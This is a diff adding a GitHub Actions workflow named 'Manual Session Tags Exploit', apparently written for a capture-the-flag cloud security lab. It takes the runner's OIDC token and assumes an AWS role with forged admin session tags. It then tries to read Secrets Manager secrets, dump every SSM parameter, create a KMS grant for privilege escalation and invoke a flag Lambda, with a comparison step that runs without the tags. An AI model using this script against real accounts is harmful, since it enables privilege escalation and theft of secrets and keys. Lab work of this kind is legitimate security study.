@@ -1,0 +1,128 @@
+name: Manual Session Tags Exploit
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  manual-session-tags:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Configure AWS credentials (basic OIDC)
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role
+          aws-region: us-east-1
+          role-session-name: github-actions-basic
+
+      - name: Get OIDC token and manually assume role with session tags
+        run: |
+          echo "=== Manual Role Assumption with Session Tags ==="
+          
+          # Get the OIDC token from GitHub Actions
+          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
+          
+          echo "OIDC Token obtained: ${OIDC_TOKEN:0:50}..."
+          
+          # Use the OIDC token to assume role with session tags
+          echo "Assuming role with session tags..."
+          ASSUME_ROLE_OUTPUT=$(aws sts assume-role-with-web-identity \
+            --role-arn arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role \
+            --role-session-name github-actions-session-tags \
+            --web-identity-token "$OIDC_TOKEN" \
+            --tags Key=Department,Value=Admin Key=Role,Value=Administrator Key=ReadFlag,Value=true Key=IsAdmin,Value=true Key=admin,Value=true Key=Environment,Value=production Key=Service,Value=github-actions Key=Privilege,Value=escalate \
+            --duration-seconds 3600 \
+            --output json)
+          
+          echo "Role assumption result:"
+          echo "$ASSUME_ROLE_OUTPUT" | jq .
+          
+          # Extract credentials from the response
+          export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
+          export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
+          export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
+          
+          echo "New credentials configured with session tags"
+          
+          # Verify the new identity
+          echo "=== Testing New Identity with Session Tags ==="
+          aws sts get-caller-identity
+          
+          # Test if session tags unlock additional permissions
+          echo "=== Testing Enhanced Permissions ==="
+          
+          echo "Testing Secrets Manager access:"
+          aws secretsmanager list-secrets || echo "List secrets failed"
+          aws secretsmanager get-secret-value --secret-id flag_whitebox_lab_2_2 || echo "Get secret failed"
+          
+          echo "Testing KMS access:"
+          aws kms list-keys || echo "KMS list failed"
+          aws kms describe-key --key-id arn:aws:kms:us-east-1:067186171322:key/1abf4a91-4a84-4395-b54c-43b6c6b60593 || echo "KMS describe failed"
+          
+          echo "Testing KMS operations:"
+          aws kms get-key-policy --key-id arn:aws:kms:us-east-1:067186171322:key/1abf4a91-4a84-4395-b54c-43b6c6b60593 --policy-name default || echo "KMS get policy failed"
+          
+          echo "Testing KMS privilege escalation:"
+          aws kms create-grant \
+            --key-id arn:aws:kms:us-east-1:067186171322:key/1abf4a91-4a84-4395-b54c-43b6c6b60593 \
+            --grantee-principal arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role \
+            --operations Decrypt DescribeKey GenerateDataKey \
+            --name "session-tags-grant" || echo "KMS create-grant failed"
+          
+          echo "Testing Parameter Store:"
+          aws ssm get-parameters-by-path --path "/" --recursive || echo "SSM get-parameters failed"
+          
+          echo "Testing Lambda access:"
+          aws lambda list-functions || echo "Lambda list failed"
+          aws lambda get-function --function-name whitebox-lab-2-flag-function || echo "Lambda get-function failed"
+          aws lambda invoke --function-name whitebox-lab-2-flag-function /tmp/lambda-output.json || echo "Lambda invoke failed"
+          if [ -f /tmp/lambda-output.json ]; then
+            echo "Lambda output:"
+            cat /tmp/lambda-output.json
+          fi
+          
+          echo "Testing additional secret names:"
+          for secret in "github-actions-flag" "session-tags-flag" "admin-secret" "deployment-secret"; do
+            aws secretsmanager get-secret-value --secret-id "$secret" || echo "Secret $secret failed"
+          done
+          
+          echo "=== Session Tags Exploitation Complete ==="
+
+      - name: Test without session tags for comparison
+        run: |
+          echo "=== Comparison: Testing without session tags ==="
+          
+          # Use the original credentials (without session tags)
+          unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+          
+          # Re-configure with basic role assumption
+          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
+          
+          BASIC_ROLE_OUTPUT=$(aws sts assume-role-with-web-identity \
+            --role-arn arn:aws:iam::067186171322:role/whitebox-lab-2-github-actions-role \
+            --role-session-name github-actions-basic \
+            --web-identity-token "$OIDC_TOKEN" \
+            --duration-seconds 3600 \
+            --output json)
+          
+          export AWS_ACCESS_KEY_ID=$(echo "$BASIC_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
+          export AWS_SECRET_ACCESS_KEY=$(echo "$BASIC_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
+          export AWS_SESSION_TOKEN=$(echo "$BASIC_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
+          
+          echo "Basic identity (no session tags):"
+          aws sts get-caller-identity
+          
+          echo "Testing same operations without session tags:"
+          aws secretsmanager get-secret-value --secret-id flag_whitebox_lab_2_2 || echo "Basic: Get secret failed"
+          aws kms describe-key --key-id arn:aws:kms:us-east-1:067186171322:key/1abf4a91-4a84-4395-b54c-43b6c6b60593 || echo "Basic: KMS describe failed"
+          
+          echo "=== Comparison Complete ==="
